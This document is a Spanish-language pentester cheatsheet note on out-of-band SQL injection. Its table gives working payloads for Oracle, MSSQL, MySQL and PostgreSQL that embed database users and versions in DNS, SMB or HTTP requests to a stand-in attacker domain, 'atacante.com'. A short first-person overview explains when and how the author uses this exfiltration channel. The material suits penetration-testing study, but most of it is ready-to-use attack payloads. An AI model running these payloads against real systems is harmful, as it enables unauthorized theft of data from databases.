---
aliases:
tags:
  - type/cheatsheet
primary categories:
secondary categories:
tertiary categories:
type: CheatSheet
linked:
  - "[[SQL Injection (SQLi)]]"
---
# SQLI - Out of Band

***

## Cheatsheet

|**SGBD**|**Vector de Exfiltración**|**Payload Estructural (Resolución Externa)**|**Requisitos y Contexto de Red**|
|---|---|---|---|
|[[Oracle]]|`UTL_INADDR` (DNS)|`SELECT UTL_INADDR.get_host_address((SELECT user)\|'.atacante.com') FROM dual`|Exige que el paquete nativo esté habilitado y que el firewall perimetral permita consultas DNS salientes.|
|[[MSSQL]]|`xp_dirtree` (DNS/SMB)|`DECLARE @q varchar(1024); SET @q = '\\'+(SELECT user)+'.atacante.com\dir'; EXEC master..xp_dirtree @q`|Altamente efectivo en entornos Windows. Fuerza una resolución DNS al intentar resolver una ruta de red UNC artificial.|
|[[MySQL]]|`LOAD_FILE()` (DNS/SMB)|`SELECT LOAD_FILE(CONCAT('\\\\',(SELECT version()),'.atacante.com\\test'))`|Restringido a despliegues sobre Windows. Depende críticamente de que la variable de entorno `secure_file_priv` esté configurada sin restricciones.|
|[[PostgreSQL]]|`COPY` / `dblink`|`COPY (SELECT version()) TO PROGRAM 'nslookup '\|(SELECT user)\|'.atacante.com'`|Demanda privilegios de superusuario o la instalación de extensiones específicas para interactuar con el sistema operativo subyacente.|
|[[Oracle]]|`UTL_HTTP` (HTTP)|`SELECT UTL_HTTP.request('http://atacante.com/'\|(SELECT user)) FROM dual`|Alternativa directa al canal DNS, transmitiendo los datos exfiltrados como parte de una ruta URI en una petición GET.|


___

## Overview

El [[OOB SQLi]] es una técnica de exfiltración asíncrona que empleo cuando los canales In-Band están clausurados y los vectores inferenciales (tiempo o booleanos) resultan inviables, inestables o demasiado lentos. En lugar de forzar a la aplicación web a devolverme los datos en su respuesta HTTP habitual, manipulo el motor de la base de datos para que actúe como cliente e inicie una conexión de red externa hacia un servidor bajo mi control.

La mecánica central consiste en concatenar el resultado de mi consulta (el dato a exfiltrar) dentro de la sintaxis de una petición saliente, comúnmente como un subdominio en una consulta DNS o como un parámetro en una solicitud HTTP. El éxito de este vector está estrictamente subordinado a los privilegios de ejecución del usuario interno de la base de datos y a la laxitud de las reglas del firewall corporativo respecto al tráfico de salida del SGBD.


***
